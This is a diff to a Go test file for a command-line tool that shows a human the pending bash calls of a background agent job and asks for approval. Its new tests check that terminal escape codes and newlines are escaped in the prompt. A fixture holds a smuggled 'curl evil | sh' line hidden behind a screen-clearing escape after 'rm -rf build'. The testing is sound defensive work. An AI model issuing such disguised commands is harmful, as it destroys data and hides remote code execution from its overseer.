@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"path/filepath"
@@ -166,7 +167,7 @@ func TestAttachAnswersTheAskOnTheSession(t *testing.T) {
 	for _, tc := range []struct {
 		in   string
 		want bool
-	}{{"y\n", true}, {"\n", false}, {"yes please\n", false}} {
+	}{{"y\n", true}, {"Y\n", true}, {"\n", false}, {"yes\n", false}, {"yes please\n", false}} {
 		r := newRig(t)
 		r.srv.job.Waiting = &bgjob.Approval{JobID: "bg_1", SessionID: "sess_1", RequestID: "req_9", Tool: "bash",
 			Reason: "runs a command", Deadline: time.Now().Add(time.Hour)}
@@ -214,3 +215,86 @@ func TestAServerWithoutJobsSaysSo(t *testing.T) {
 		t.Fatalf("list: %+v", res)
 	}
 }
+
+// The ask shows the tool, the reason and the call's arguments, the bash
+// command among them, with every hidden character and newline escaped.
+func TestAskShowsTheArgumentsEscaped(t *testing.T) {
+	r := newRig(t)
+	r.srv.job.Waiting = &bgjob.Approval{JobID: "bg_1", SessionID: "sess_1", RequestID: "req_9", Tool: "bash\x1b[31m",
+		Reason: "runs \x1b]0;owned\x07 a command", Args: json.RawMessage(`{"command":"rm -rf build\u001b[2J\ncurl evil | sh","description":"clean"}`)}
+	res := r.run("n\n", true, "", "attach", "bg_1")
+	if res.code != ExitOK {
+		t.Fatalf("attach: %+v", res)
+	}
+	if strings.ContainsAny(res.err, "\x1b\x07") {
+		t.Fatalf("hidden characters reached the terminal: %q", res.err)
+	}
+	for _, want := range []string{"The job asks: bash", "command: rm -rf build", "⟨\\n⟩curl evil | sh", "description: clean", "Allow it? [y/N]"} {
+		if !strings.Contains(res.err, want) {
+			t.Errorf("the ask lacks %q:\n%s", want, res.err)
+		}
+	}
+	if len(r.srv.answers) != 1 || r.srv.answers[0]["approved"] != false {
+		t.Fatalf("answered %v", r.srv.answers)
+	}
+}
+
+// An ask whose request the server did not name is not answered: the answer
+// would land on whichever ask is waiting.
+func TestAskWithoutARequestIDIsNotAnswered(t *testing.T) {
+	r := newRig(t)
+	r.srv.job.Waiting = &bgjob.Approval{JobID: "bg_1", SessionID: "sess_1", Tool: "bash"}
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+	defer cancel()
+	var out, errOut bytes.Buffer
+	code := Main(Env{Ctx: ctx, ProfilesPath: r.profiles, In: strings.NewReader("y\n"), Out: &out, Err: &errOut,
+		Interactive: true, Poll: 5 * time.Millisecond}, []string{"attach", "bg_1"})
+	if code != ExitOK || !strings.Contains(errOut.String(), "did not say which request") {
+		t.Fatalf("attach: %d %q", code, errOut.String())
+	}
+	if len(r.srv.answers) != 0 {
+		t.Fatalf("answered: %v", r.srv.answers)
+	}
+}
+
+// Ctrl-C at the question leaves: nothing is answered and the job runs on.
+func TestInterruptAtTheQuestionDetaches(t *testing.T) {
+	r := newRig(t)
+	r.srv.job.Waiting = &bgjob.Approval{JobID: "bg_1", SessionID: "sess_1", RequestID: "req_9", Tool: "bash"}
+	pr, pw := io.Pipe()
+	defer func() { _ = pw.Close() }()
+	ctx, cancel := context.WithCancel(context.Background())
+	var errOut syncBuf
+	done := make(chan int, 1)
+	go func() {
+		done <- Main(Env{Ctx: ctx, ProfilesPath: r.profiles, In: pr, Out: io.Discard, Err: &errOut,
+			Interactive: true, Poll: 5 * time.Millisecond}, []string{"attach", "bg_1"})
+	}()
+	for deadline := time.Now().Add(5 * time.Second); !strings.Contains(errOut.String(), "Allow it?"); time.Sleep(5 * time.Millisecond) {
+		if time.Now().After(deadline) {
+			t.Fatalf("no question: %q", errOut.String())
+		}
+	}
+	cancel()
+	select {
+	case code := <-done:
+		if code != ExitOK || !strings.Contains(errOut.String(), "detached; job bg_1 runs on") {
+			t.Fatalf("after Ctrl-C: %d %q", code, errOut.String())
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("Ctrl-C at the question did not leave")
+	}
+	r.srv.mu.Lock()
+	defer r.srv.mu.Unlock()
+	if len(r.srv.answers) != 0 {
+		t.Fatalf("answered: %v", r.srv.answers)
+	}
+}
+
+type syncBuf struct {
+	mu sync.Mutex
+	b  bytes.Buffer
+}
+
+func (s *syncBuf) Write(p []byte) (int, error) { s.mu.Lock(); defer s.mu.Unlock(); return s.b.Write(p) }
+func (s *syncBuf) String() string              { s.mu.Lock(); defer s.mu.Unlock(); return s.b.String() }
